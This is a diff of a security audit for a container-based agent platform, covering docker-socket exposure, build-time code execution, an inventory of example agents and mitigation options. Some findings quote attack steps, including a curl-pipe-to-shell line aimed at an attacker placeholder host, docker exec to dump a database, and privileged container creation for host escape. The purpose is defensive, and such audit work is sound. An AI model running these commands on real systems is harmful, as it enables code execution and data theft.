@@ -75,7 +75,7 @@ HIVEMIND_ENFORCE_BRIDGE_ONLY_EGRESS: "false"
   postgres itself.
 - The bridge server binds to `0.0.0.0` (`HIVEMIND_BRIDGE_HOST` in the same
   compose file), so any container on the docker network can reach any
-  active bridge port — see finding #3.
+  active bridge port — see finding #4.
 
 What an attacker can do today:
 
@@ -109,52 +109,138 @@ defence-in-depth layer assumes this one is in place.
 
 ---
 
-### 2. CRITICAL CONTEXT — Docker socket from the host is mounted into hivemind-core
+### 2. MEDIUM — Hivemind-core holds an unrestricted, shared docker socket
 
-**Status: confirmed; affects severity of every other finding.**
+**Status: confirmed.**
 
-The architecture diagrams describe this as "Docker-in-Docker", but
 `deploy/phala/docker-compose.core.yaml:50` mounts
-`/var/run/docker.sock:/var/run/docker.sock` from the host into the
-hivemind-core container. The same mount is present in the
-working-tree-only `deploy/docker-compose.cvm.yaml`, which also extends
-it to the SSH debug sidecar.
+`/var/run/docker.sock:/var/run/docker.sock` from the dstack guest into
+the hivemind-core container.
 
-Mounting the host docker socket into a container is equivalent to giving
-that container root on the host. Inside a CVM the "host" is the dstack
-guest VM, so the operator already trusts the hivemind-core process, but
-the implications cascade:
+This is necessary in some form: hivemind-core's whole job is to manage
+agent containers, so it has to talk to a docker daemon somehow. The
+finding is *not* "the socket is mounted" — it's that the socket as
+mounted today gives hivemind-core two properties it doesn't need:
 
-- Any RCE in hivemind-core inherits full docker daemon control via the
-  socket. The attacker can start any image,
-  bind-mount any host path, attach to any network. The "agent container
-  is sandboxed" boundary doesn't survive RCE in the orchestrator.
-- The `docker build` invocation at `docker_runner.py:684` runs the
-  attacker's `Dockerfile` against the *real* host docker daemon. Standard
-  builds aren't privileged, but `RUN curl http://attacker/ | sh` during
-  build will execute attacker code with the daemon's default build-time
-  privileges, with network access (the build network is separate from the
-  agent runtime network and is not subject to the iptables rules in
-  finding #1, even when those rules are enabled).
-- BuildKit's `RUN --security=insecure` requires the daemon to be
-  configured with `insecure-entitlements`. Worth confirming that the CVM
-  daemon does not enable this.
-- The SSH debug sidecar on port 2222 with a static password (per the
-  deploy notes) shares the same docker socket. Anyone who reaches that
-  port has root on the CVM.
+#### 2a. The daemon is shared between hivemind-core and the rest of the CVM
 
-**Mitigations to consider:**
+The same daemon manages hivemind-core's agent containers *and* the
+postgres container *and* the frontend nginx *and* whatever else runs
+on the CVM. A bug in hivemind-core (FastAPI deserialization, agent ID
+escaping, the scope-fn AST having a future undiscovered escape) that
+gives an attacker control of in-process docker API calls can reach all
+of those. Specifically it can:
 
-- Use a rootless or BuildKit-in-namespace setup so the build is not
-  bound to the host daemon.
-- Drop the SSH sidecar from production deployments, or at minimum bind
-  it to a non-routable interface and rotate the password.
-- Document loudly in `AUDIT.md` that the agent-container boundary
-  collapses on hivemind-core RCE.
+- `docker exec` into the postgres container and dump the database
+  directly, bypassing the entire query-pipeline scope-fn machinery.
+- `docker cp` arbitrary paths out of any container the daemon manages.
+- `containers/create` a new container with `Privileged=true` or
+  `HostConfig.Binds=["/:/host"]` and chroot into the host filesystem.
+
+None of these require defeating the kernel sandbox — they're docker
+API calls hivemind-core already has the right to make. The privacy
+guarantee already depends on hivemind-core not being compromised, but
+the *blast radius of a hivemind-core compromise* is much larger than
+it needs to be because the daemon is shared.
+
+**Direction:** give hivemind-core its own daemon. Either nest a docker
+daemon inside hivemind-core via sysbox (no `--privileged` required —
+sysbox makes nested daemons safe), or restructure the CVM so that the
+agent-spawning daemon is a separate process from the one that runs
+postgres/frontend. See Appendix A.4.
+
+#### 2b. Hivemind-core holds permissions for the entire docker API, not the ~10 endpoints it actually uses
+
+Grepping the codebase, the docker API operations hivemind-core exercises
+are roughly: `images/build`, `images/get`, `images/pull`,
+`containers/create`, `containers/start`, `containers/wait`,
+`containers/logs`, `containers/remove`, `networks/create`,
+`networks/get`. Maybe a dozen endpoints total.
+
+The full docker API exposes dozens more, including the dangerous ones
+`exec`, `archive`, `commit`, `cp`, and `containers/create` with
+`Privileged=true` or escape-shaped `HostConfig.Binds`. None of these
+are called by hivemind-core in normal operation.
+
+If a bug in hivemind-core lets an attacker influence what API call
+gets made — e.g., a path-traversal in an agent ID that lets them
+construct a `containers/{id}/exec` URL — the daemon will happily
+execute it because the socket has full permissions.
+
+**Direction:** narrow the docker API surface hivemind-core can call to
+exactly what it actually needs. This is the same logic as
+`cap_drop: ALL` then add back the capabilities you use, applied to the
+docker API. A small reverse-proxy in front of `/var/run/docker.sock`
+that allowlists endpoints is the minimum viable version. Reference
+implementation in ~80 lines: hermes-agent's
+`tee-socket-proxy/proxy/docker_proxy.py:42-44` denies
+`/containers/{id}/(exec|archive)` for exactly this reason. The
+`Tecnativa/docker-socket-proxy` project (used widely in Traefik
+deployments) is a more complete reference.
+
+The two sub-findings are independent. (2b) is cheap to fix and worth
+doing immediately. (2a) is a larger restructuring that might wait
+until you're touching the deploy layout for other reasons.
 
 ---
 
-### 3. MEDIUM — Bridge server binds to 0.0.0.0 with unauthenticated `/health`
+### 3. MEDIUM — `docker build` runs attacker code outside the runtime sandbox
+
+**Status: confirmed.**
+
+When a query agent is uploaded, hivemind-core extracts the tar and
+calls `client.images.build(...)` against the host docker daemon
+(`hivemind/sandbox/docker_runner.py:684`, invoked from
+`server.py:843` and similar). The build executes the attacker's
+`Dockerfile` step by step, including any `RUN` instructions, *before*
+the runtime sandbox flags (cap_drop, read_only, internal network,
+iptables rules) are ever applied — those only kick in when the
+*resulting image* is started later.
+
+What an attacker can do during build that they cannot do at runtime:
+
+- **Phone home with internet access regardless of finding #1.** The
+  build network is separate from the agent runtime network and is
+  not subject to the iptables `DOCKER-USER` rules even when those
+  rules are enabled. So a `RUN curl http://attacker.example/ | sh`
+  step works during build whether or not the runtime egress
+  enforcement is on.
+- **Execute attacker code with the build daemon's default
+  privileges.** Standard `docker build` is not `--privileged`, but
+  it does run with normal Linux capabilities (CAP_NET_BIND_SERVICE,
+  CAP_CHOWN, etc.) and full access to the build context. BuildKit's
+  `RUN --security=insecure` requires the daemon to be configured
+  with `insecure-entitlements` — worth verifying the CVM daemon
+  does not have this enabled.
+- **Persist payload across the build/runtime boundary.** Bake an
+  exfiltration helper into the image during build and trigger it at
+  runtime; the runtime sandbox flags constrain *what the image can
+  do once running* but they cannot retroactively remove things baked
+  into image layers.
+
+**Why this is its own finding rather than part of #2:** the
+mitigations are different. The shared/unrestricted socket problem in
+#2 is fixed by daemon isolation and API allowlisting. The build-time
+execution problem here is fixed by either:
+
+- Running builds with BuildKit in a network-restricted namespace
+  (rootless build, or `--network=none` for build steps), so attacker
+  code cannot call out during build, OR
+- **Not running `docker build` on attacker input at all.** This is
+  feasible for hivemind specifically — see the empirical observations
+  section below — because no example query agent in the repo actually
+  needs build-time `RUN` steps. If the trust unit changed from
+  "Dockerfile + arbitrary build context" to "Python script + a small
+  declared dependency list", the build phase as an attack surface
+  disappears completely.
+
+The BuildKit-network-restriction fix is operationally lighter; the
+"stop accepting Dockerfiles" fix is structurally cleaner. See
+Appendix A.4 for the migration sketch.
+
+---
+
+### 4. MEDIUM — Bridge server binds to 0.0.0.0 with unauthenticated `/health`
 
 `HIVEMIND_BRIDGE_HOST: "0.0.0.0"`
 (`deploy/phala/docker-compose.core.yaml:32`), combined with
@@ -197,7 +283,7 @@ Cost: trivial.
 
 ---
 
-### 4. MEDIUM — Deferred S3 uploads bypass mediator inspection
+### 5. MEDIUM — Deferred S3 uploads bypass mediator inspection
 
 The S3 upload endpoint (`hivemind/sandbox/bridge.py:609-631`) was recently
 refactored so that calls to `/sandbox/s3-upload` *buffer* the bytes in
@@ -267,7 +353,7 @@ There are two distinct gaps here:
 
 ---
 
-### 5. LOW — `apply_scope_fn` subprocess timeout is dead code on the production path
+### 6. LOW — `apply_scope_fn` subprocess timeout is dead code on the production path
 
 `hivemind/scope.py` defines `apply_scope_fn` (an `multiprocessing.Process`
 wrapper that runs `scope_fn` in a child process with `SCOPE_FN_TIMEOUT`
@@ -311,7 +397,7 @@ and means future call sites benefit automatically.
 
 ---
 
-### 6. NOT EXPLOITABLE — Tape replay budget bypass
+### 7. NOT EXPLOITABLE — Tape replay budget bypass
 
 Initially flagged as a possible budget-bypass vector. After tracing it,
 not exploitable from the query-agent side.
@@ -336,10 +422,10 @@ envelope. Mark this one mitigated.
 
 ---
 
-### 7. Lower-severity observations
+### 8. Lower-severity observations
 
 Note: the S3 upload endpoint observation that originally lived here has
-been promoted to its own finding (#4) after deeper review.
+been promoted to its own finding (#5) after deeper review.
 
 - **No image cleanup on failure or after run.** `_build_and_run`
   (`server.py:843`) builds an image and registers an agent, but I didn't
@@ -364,6 +450,137 @@ been promoted to its own finding (#4) after deeper review.
   talking to the bridge — and the leaked token only grants access the
   agent already has. Worth a comment in the code so future readers don't
   flag it as a credential leak.
+
+---
+
+## Empirical observations: what example query agents in this repo actually do
+
+Several findings above (especially #2 and #3) raise the question:
+**how much of the "user supplies an arbitrary Docker image" flexibility
+is actually being exercised?** The answer matters because the cost of
+narrowing the trust unit is proportional to the flexibility you'd
+lose, and the benefit is proportional to the attack surface you'd
+remove.
+
+This section is empirical evidence, not proof. It describes what
+exists in `agents/examples/` *today*; it does not preclude future
+agents from needing more flexibility, and it does not argue that the
+current trust unit is wrong. It's input for that decision, not the
+decision itself.
+
+### Inventory of example agents
+
+There are seven example agents under `agents/`:
+
+| Agent | LoC | Base image | Dependencies (pip) |
+|---|---|---|---|
+| `default-query/` | 79 | `hivemind-agent-sdk-base:latest` | (inherits SDK base) |
+| `examples/simple-query/` | 92 | `python:3.12-slim` | `httpx` |
+| `examples/tool-loop-query/` | 244 | `python:3.12-slim` | `httpx` |
+| `examples/tiktok-analytics/` | 167 | `python:3.12-slim` | `httpx` |
+| `examples/agent-sdk-query/` | 121 | `hivemind-agent-sdk-base:latest` | (inherits SDK base) |
+| `examples/metadata-scope/` | 51 | `python:3.12-slim` | `httpx` |
+| `examples/redact-mediator/` | 77 | `python:3.12-slim` | `httpx` |
+
+### What they do
+
+All seven follow the same shape:
+
+1. Read environment variables (`BRIDGE_URL`, `SESSION_TOKEN`, `QUERY_PROMPT`, `QUERY_CONTEXT`).
+2. Make HTTP calls via `httpx` to the bridge server: `POST /tools/{name}` for tool calls, `POST /llm/chat` for LLM calls.
+3. Parse JSON responses, run some Python loop logic (parallel tool dispatch, context compaction, tag parsing).
+4. `print()` the final answer to stdout, which hivemind captures via container logs.
+
+The most complex agent (`tool-loop-query`, 244 lines) implements:
+
+- Multi-turn agentic tool loop
+- Parallel tool execution via `asyncio.gather`
+- Auto-compaction of LLM context when it grows past a character threshold
+- Structured tool-call parsing from `\`\`\`tool` JSON blocks in LLM output
+
+It does all of this in pure Python with `httpx` and `asyncio` from the
+standard library. No native code, no shell pipelines, no
+`subprocess`, no compiled dependencies.
+
+### What they do *not* do
+
+A grep of `agents/examples/*/agent.py` and `agents/default-query/agent.py`
+finds:
+
+- Zero `subprocess`, `os.system`, `os.popen`, or `exec(` calls.
+- Zero use of `pandas`, `numpy`, `scipy`, `torch`, `tensorflow`, `polars`, `duckdb`, or any other heavy data library.
+- Zero use of native binaries, system tools, or shell utilities.
+- Zero `RUN` steps in Dockerfiles beyond `pip install -r requirements.txt`.
+- Zero multi-stage builds, no `apt-get install`, no curl-pipe-sh.
+- Zero filesystem writes outside what `print()` and Python's import machinery do implicitly.
+
+The Dockerfiles are uniformly:
+
+```dockerfile
+FROM python:3.12-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install --no-cache-dir -r requirements.txt
+COPY agent.py .
+CMD ["python", "agent.py"]
+```
+
+### What this evidence supports — and what it doesn't
+
+**Supports:** the *current* trust unit ("a tar archive containing a
+Dockerfile and arbitrary build context") is much more flexible than
+the *current* agents need. Every example in the repo could be
+expressed as a much narrower object — say, a Python script plus a
+declared dependency list from a small allowlist — without losing any
+functionality. Under that narrower trust unit, finding #3 (build
+phase) goes away entirely, and finding #2 becomes easier to fix
+because hivemind-core no longer needs `images/build` permission on
+the docker daemon.
+
+**Does not support:** the conclusion that the Dockerfile-based trust
+unit is wrong in general. There are plausible future query agents
+that *would* exercise more flexibility — anything that wants pandas
+for data manipulation, anything that wants to run a small ML model,
+anything that needs a non-Python language. The same caveat applies
+to oauth3's SES Compartment design: today's capability functions fit,
+but a future capability that needs richer compute would need a
+different runtime.
+
+The decision is therefore not "Docker is wrong" but "what's the
+target flexibility envelope for query agents, and does the current
+trust unit fit it?" Three plausible answers:
+
+1. **Open-ended.** Users can ship whatever code in whatever language.
+   The current Docker-image trust unit is correct; the audit
+   findings should be addressed with daemon isolation (sysbox) and
+   API allowlisting (guarded socket proxy), not by narrowing the
+   trust unit.
+2. **Python-with-pip-allowlist.** Users ship a Python script and a
+   `requirements.txt` constrained to a vetted set of packages
+   (e.g., `httpx`, `pandas`, `numpy`, `httpx`, `claude-agent-sdk`).
+   No Dockerfile, no `RUN` steps, no build-time arbitrary code
+   execution. The runtime is a hivemind-supplied base image into
+   which the user's script is dropped.
+3. **Httpx-only Python.** Even narrower: users ship only the script,
+   the runtime is a fixed image, the only allowed dependency is the
+   bridge client. Equivalent to what `agents/examples/simple-query/`
+   actually is today.
+
+Option 1 keeps the Dockerfile model and pays the cost of finding #2
+and #3 mitigations. Option 2 eliminates finding #3 entirely and
+simplifies finding #2's mitigation. Option 3 eliminates both *and*
+makes the trust unit small enough that something other than runc
+(bwrap, or even Wasmtime if the agents were compiled to Wasm)
+becomes operationally plausible.
+
+The example agents are evidence that **Option 2 or 3 would not
+restrict any current functionality**. They are not evidence that
+Option 2 or 3 is the right choice. That depends on what flexibility
+you want hivemind to support going forward, which is a product
+question rather than a security one. The audit's job here is to
+flag that the choice exists and that the current Option-1
+implementation has costs the alternatives wouldn't.
+
 ---
 
 ## Compare and contrast: oauth3-enclave
@@ -444,12 +661,18 @@ secrets. They diverge on the unit of trust.
 
 ### Where hivemind is structurally stronger
 
-1. **Hivemind's threat model is harder.** It hosts arbitrary
-   user-supplied analytics code that needs a real Python runtime, NumPy,
-   pandas, whatever. oauth3 only hosts very small "do this API call"
-   snippets. You can't reasonably SES-sandbox a 500-line pandas
-   analysis; the OS-level container is the right tool when the trust
-   unit has to be a real program.
+1. **Hivemind's threat model is *intended* to be harder.** The design
+   accommodates arbitrary user-supplied analytics code that could need
+   a real Python runtime, NumPy, pandas, native binaries, multiple
+   languages — anything that fits in a Docker image. oauth3 only hosts
+   very small "do this API call" snippets in a SES Compartment. The
+   OS-level container is the right tool when the trust unit *has to
+   be* a real program. The empirical observation in the section above
+   is that the *current* example agents don't actually need that
+   flexibility, so the "intended" threat model is wider than the
+   "exercised" one — but a future agent that needs pandas would
+   immediately need the wider envelope, and the design accommodates
+   that.
 
 2. **SQL row filtering is something oauth3 doesn't attempt.** The whole
    `AccessLevel.SCOPED` + post-query `scope_fn` row-filter pattern is
@@ -522,30 +745,53 @@ In rough priority order:
    iptables-in-image issue and turn enforcement back on, or move the
    network policy into the bridge so it doesn't depend on host
    firewall state.
-2. **Wire `apply_scope_fn` into the `execute_sql` tool path** (finding #5).
-   The subprocess timeout already exists; the production call site
-   doesn't reach it. Either route `tools.py` through `apply_scope_fn`
-   with the source threaded through `Tool` construction, or replicate
-   the multiprocessing pattern at the direct call site.
-3. **Decide whether the S3 channel needs mediator review** (finding #4).
-   At minimum cancel pending uploads when the mediator scrubs the
-   placeholder URL out of the text output. Better: route the buffered
-   bytes through a content mediator before the upload loop runs.
-4. **Gate `/health`** behind the session token, or strip the budget
-   summary out of the unauthenticated response (finding #3).
-5. **Document in `AUDIT.md`** that the docker-socket mount means
-   hivemind-core RCE collapses the agent-container isolation boundary
-   (finding #2).
-6. **Audit `_safe_extract_tar`** for tar-slip and symlink handling.
-7. **Add a concurrency cap** on `submit_query_agent` background builds.
+2. **Add a guarded docker-socket proxy** (finding #2b). Cheapest
+   structural improvement in the audit. Allowlist the ~10 docker API
+   endpoints hivemind-core actually uses; deny `exec`, `archive`,
+   `commit`, `cp`, and `containers/create` with privileged or escape-
+   shaped `HostConfig`. Reference: hermes-agent's
+   `tee-socket-proxy/proxy/docker_proxy.py:42-44`. ~1 day of work,
+   no operational change for callers.
+3. **Restrict the build network or stop accepting Dockerfiles**
+   (finding #3). Two viable paths: (a) run `docker build` in a
+   network-restricted namespace so attacker `RUN` steps can't phone
+   home during build, or (b) replace the Dockerfile-based trust unit
+   with a script-plus-deps model — see the empirical observations
+   section above. (a) is operationally lighter; (b) is structurally
+   cleaner and is feasible because no example agent currently needs
+   build-time `RUN`.
+4. **Wire `apply_scope_fn` into the `execute_sql` tool path**
+   (finding #6). The subprocess timeout already exists; the
+   production call site doesn't reach it. Either route `tools.py`
+   through `apply_scope_fn` with the source threaded through `Tool`
+   construction, or replicate the multiprocessing pattern at the
+   direct call site.
+5. **Decide whether the S3 channel needs mediator review**
+   (finding #5). At minimum cancel pending uploads when the mediator
+   scrubs the placeholder URL out of the text output. Better: route
+   the buffered bytes through a content mediator before the upload
+   loop runs.
+6. **Gate `/health`** behind the session token, or strip the budget
+   summary out of the unauthenticated response (finding #4).
+7. **Audit `_safe_extract_tar`** for tar-slip and symlink handling.
+8. **Add a concurrency cap** on `submit_query_agent` background builds.
 
-The largest structural improvement, if you're willing to take it, is
-**removing LLM-generated code from the enforcement path** by replacing
-`scope_fn` source with a declarative spec interpreted by hand-written
-Python. The current AST blocklist in `compile_scope_fn` is well-built
-but is a "deny known escapes" model and will need a new check every
-time a new escape vector is published; a declarative spec eliminates
-that whole class of risk by construction.
+A separate, larger structural decision worth scheduling: **decide
+whether the trust unit should remain "arbitrary Docker image" or
+should narrow to "Python script + dependency allowlist"** (see the
+empirical observations section). This is a product decision rather
+than a security one, but it determines which mitigations from
+Appendix A.4 are appropriate.
+
+A second large structural improvement, if you're willing to take it,
+is **removing LLM-generated code from the enforcement path** by
+replacing `scope_fn` source with a declarative spec interpreted by
+hand-written Python. The current AST blocklist in `compile_scope_fn`
+is well-built but is a "deny known escapes" model and will need a new
+check every time a new escape vector is published; a declarative spec
+eliminates that whole class of risk by construction. This is
+independent of the trust-unit decision and would be valuable
+regardless.
 
 ---
 
@@ -658,62 +904,167 @@ Docker reserved for compute-heavy jobs.
 | **TEE measurement** | One-shot at deploy | None | Per-container RTMR via dstack | dstack KMS chain | None |
 | **Output review** | Mediator filters text only | Bundle/diff review gate | None | Capability response shaping | Leak detector + tag sanitization |
 
-### A.4. Three directions for hivemind, in increasing scope
+### A.4. Directions for hivemind, in increasing scope
 
-These are sketches, not designs. Each is meant to be a starting point
-for a more detailed conversation, not a finished proposal.
+These are sketches, not designs. Each is a starting point for a more
+detailed conversation, not a finished proposal. The "reference"
+column points at peer prototypes (smithers, hermes-agent, ironclaw,
+oauth3) where the same pattern appears — these are research codebases,
+not production deployments. Where I cite production users it's of
+the underlying technology, not of any of those projects.
 
-**Direction 1 — Guarded socket proxy (~1 day, smallest blast-radius reduction).**
+**Direction 1 — Guarded socket proxy (~1 day, addresses finding #2b).**
 
-Borrow hermes-agent's pattern. Put a thin proxy in front of
-`/var/run/docker.sock` that allows the operations hivemind-core actually
-needs (`build`, `create`, `start`, `wait`, `logs`, `remove`, `images/*`)
-and denies the rest (`exec`, `archive`, `commit`, `cp`, anything with
-`HostConfig.Privileged=true`, `HostConfig.PidMode=host`, dangerous
-`HostConfig.Binds` patterns). Hivemind-core mounts the proxy socket
-instead of the real one. An RCE in hivemind-core can no longer trivially
-break out via `exec` into a privileged sidecar or read host files via
-`archive`. Doesn't address the kernel attack surface — that's still
-runc — but it does remove the "RCE in hivemind-core ⇒ root on CVM
-host" property that finding #2 highlights. Reference implementation in
-~80 lines: `~/projects/hermes-agent/tee-socket-proxy/proxy/docker_proxy.py`.
+Put a thin proxy in front of `/var/run/docker.sock` that allows the
+operations hivemind-core actually needs (`build`, `images/*`,
+`containers/{create,start,wait,logs,remove}`, `networks/{create,get}`)
+and denies the rest. Hivemind-core mounts the proxy socket instead of
+the real one. A bug in hivemind-core that lets an attacker influence
+docker API calls can no longer reach `exec`, `archive`, `commit`,
+`cp`, or `containers/create` with privileged HostConfig — those just
+return 403 at the proxy. Doesn't change the kernel attack surface or
+the daemon-sharing problem (#2a), but the API-surface reduction is
+cheap and immediate.
 
-**Direction 2 — sysbox under hivemind-core (~1 week, eliminates docker-socket finding entirely).**
+Reference (peer prototype): hermes-agent's
+`tee-socket-proxy/proxy/docker_proxy.py:42-44` is the minimum viable
+denylist version (~80 lines).
 
-Install sysbox as a runtime on the dstack guest VM. Run hivemind-core
-itself under sysbox. Inside hivemind-core, run a *nested* docker
-daemon — sysbox makes this work without `--privileged` because root
-in the sysbox container is genuinely unprivileged on the host. The
-host docker socket is no longer mounted into hivemind-core at all.
-Finding #2 disappears entirely. Agent containers spawned by the
-nested daemon have the same isolation properties they have today.
-Operational cost: sysbox needs to be available on the dstack image,
-which may or may not be allowed by your CVM provisioning. Worth
-checking with Phala whether `sysbox-runc` can be installed in the
-guest.
+Reference (production users of the underlying technique): the
+`Tecnativa/docker-socket-proxy` project is widely used in Traefik
+deployments where Traefik needs to read container labels but doesn't
+need to spawn containers. The technique itself is established;
+cherry-pick the parts that fit hivemind's API needs.
 
-**Direction 3 — Bundle airlock for agent outputs (~1-2 weeks, addresses finding #4).**
+**Direction 2 — Daemon separation via sysbox or equivalent (~1 week, addresses finding #2a).**
 
-Borrow smithers' approach. Instead of letting the query agent directly
-call `/sandbox/s3-upload`, have it write to a quarantined directory in
-its container. After the agent exits, hivemind-core packages
-everything the agent wrote into a bundle (text output + binary blobs +
-metadata) and presents the *whole bundle* to the mediator. The
-mediator gets to inspect or veto each artifact, not just the text.
-Approved artifacts are then released — to S3, to the response, or
-wherever. This eliminates the "S3 channel bypasses mediator inspection"
-gap from finding #4 by construction, and gives a foundation for
-auditable per-artifact access control. Smithers' bundle format
-(`~/projects/smithers-repo/src/sandbox/bundle.ts`) is a useful
-reference for the manifest schema.
+Make hivemind-core's docker daemon separate from the daemon that runs
+postgres / frontend / monitoring. Two ways to do this:
 
-These three directions are roughly orthogonal and could be done in
-sequence: Direction 1 is a quick win, Direction 2 is the structural
-fix for the docker-socket problem, Direction 3 is the structural fix
-for the unmediated-egress problem.
+- **Nested daemon under sysbox.** Install sysbox as a runtime on the
+  dstack guest. Run hivemind-core under sysbox. Inside hivemind-core,
+  run a docker daemon — sysbox makes nested daemons work without
+  `--privileged`. Hivemind-core no longer mounts the host socket at
+  all; it talks to its own inner daemon. A compromised hivemind-core
+  cannot reach postgres or frontend via `docker exec` because they're
+  on a different daemon entirely.
+- **Separate compose stack.** Less elegant but simpler operationally:
+  run two docker daemons on the dstack guest, one for "platform"
+  containers (postgres, frontend, monitoring) and one for
+  "agent-spawning". Hivemind-core mounts only the agent-spawning
+  socket. No sysbox dependency.
 
-A separate note worth recording: **per-container RTMR measurement via
-dstack** (the hermes-agent pattern) is independent of the isolation
-choice and would strengthen the attestation story regardless of
-runtime. ~50 lines of Python; reference at
-`~/projects/hermes-agent/tee-socket-proxy/proxy/audit.py:36-51`.
+Operational cost of the sysbox path: sysbox needs to be available on
+the dstack image. Worth checking with Phala whether `sysbox-runc` can
+be installed in the dstack guest, or whether a custom CVM image is
+required.
+
+Reference (peer prototype): none of the surveyed projects do this
+exactly — hermes-agent uses one daemon with a guarded socket
+(Direction 1 pattern), oauth3 has no daemon at all.
+
+Reference (production users of sysbox): Nestybox (now part of
+Docker Inc) markets the "secure CI runner / dev environment" use case
+specifically. GitLab CI executor has a sysbox option. Several
+agent-execution vendors have used it for per-tenant docker daemons.
+
+**Direction 3 — Bundle airlock for agent outputs (~1-2 weeks, addresses finding #5).**
+
+Instead of letting the query agent directly call `/sandbox/s3-upload`,
+have it write to a quarantined directory inside its container. After
+the agent exits, hivemind-core packages everything the agent wrote
+into a structured bundle (text output + binary blobs + manifest) and
+presents the bundle to the mediator. The mediator gets to inspect or
+veto each artifact, not just the text. Approved artifacts are then
+released — to S3, to the response, or wherever. This eliminates the
+"S3 channel bypasses mediator inspection" gap from finding #5 by
+construction.
+
+Reference (peer prototype): smithers' bundle format
+(`~/projects/smithers-repo/src/sandbox/bundle.ts:10-15`) is a useful
+manifest schema reference, though smithers uses bundles for
+diff-review on the parent workflow side rather than for mediator
+inspection. The structural idea is the same: quarantine outputs in a
+typed container, gate release on review.
+
+**Direction 4 — Narrow the trust unit from "Docker image" to "Python script + dep allowlist" (larger, addresses findings #2 and #3 by construction).**
+
+This is the structural option that the empirical observations section
+above sets up. Instead of accepting an arbitrary tar with a
+Dockerfile and arbitrary build context, accept a small structured
+object: a Python script, a manifest declaring entry point and
+dependencies (constrained to a vetted allowlist of pip packages),
+and optional config. Hivemind ships a fixed base image; the user's
+script is dropped in and run.
+
+What goes away:
+
+- **Finding #3 entirely.** No `docker build` on attacker input means
+  no build-time arbitrary code execution.
+- **Half of finding #2.** Hivemind-core no longer needs `images/build`
+  permission on the docker daemon. The remaining permissions are
+  `images/get`, `containers/{create,start,wait,logs,remove}` —
+  even smaller surface for the guarded socket proxy in Direction 1.
+- **The "user-supplied image registry" problem.** No more
+  `hivemind-agent-{id}:latest` images accumulating on disk.
+- **The image-extraction code path** (`docker_runner.py:736`,
+  used by the scope agent to inspect query-agent source). Replaced
+  by reading the script directly from a known location.
+
+What you give up:
+
+- Multi-language support. Python only.
+- Arbitrary system-level dependencies (apt packages, native binaries).
+- Custom base images. No `FROM tensorflow/tensorflow:gpu`.
+- Any future query-agent design that needs to do something Python
+  can't reasonably do in pure-Python with allowlisted packages.
+
+The empirical observations section above shows that *no current
+example agent uses any of those things*. Every example is "python
++ httpx + asyncio + JSON parsing". So the cost in the present is
+zero. The cost in the future depends on what query agents you want
+to support — agents that need pandas/numpy could be accommodated by
+expanding the allowlist; agents that need shelling out to native
+binaries or running ML models with GPU dependencies could not.
+
+Reference (peer prototype): oauth3's capability-spec model is the
+closest analogue (declarative spec, no `exec` of user-supplied code
+at runtime), though oauth3 narrows further than this would — it
+restricts the *language* to what fits in a SES Compartment, not to
+"any Python in a sandbox". The pattern for hivemind would be more
+like AWS Lambda's "function code + dependency layer" model.
+
+Reference (production users of the general "scripts + dep allowlist"
+pattern): Cloudflare Workers (V8 isolates with a fixed runtime),
+AWS Lambda (Python runtime + layers), Vercel/Netlify edge functions.
+These are all production at scale, all narrow the trust unit to
+"function code + declared deps" rather than "arbitrary container".
+
+**Orthogonal: per-container RTMR measurement via dstack.**
+
+Independent of the isolation choice, **measuring each container into
+a dstack RTMR** would strengthen hivemind's attestation story.
+Today's deployment notarizes the application code on Base L2 once at
+deploy time, but doesn't record per-query-agent measurement, so a
+malicious operator could swap which query-agent images are running
+at runtime without leaving an attestable record. Hermes-agent's
+approach (`~/projects/hermes-agent/tee-socket-proxy/proxy/audit.py:36-51`)
+is ~50 lines of Python that posts every container lifecycle event
+to dstack's `/EmitEvent` endpoint.
+
+### A.5. Suggested sequencing
+
+Directions 1 and 4 are roughly orthogonal and address different
+problems; they could be done independently. Direction 2 is harder
+than 1 and addresses a different sub-problem (#2a vs #2b), so do it
+later if at all. Direction 3 is independent of all the above and
+addresses finding #5.
+
+A pragmatic order:
+
+1. Direction 1 (guarded socket proxy) — fixes #2b, ~1 day.
+2. Direction 3 (bundle airlock) — fixes #5, ~1-2 weeks.
+3. Decide on the trust unit envelope (narrow or open-ended).
+4. If narrow: Direction 4 (replace Dockerfile model). If
+   open-ended: Direction 2 (sysbox / daemon separation).
+5. Add per-container RTMR measurement at any point.
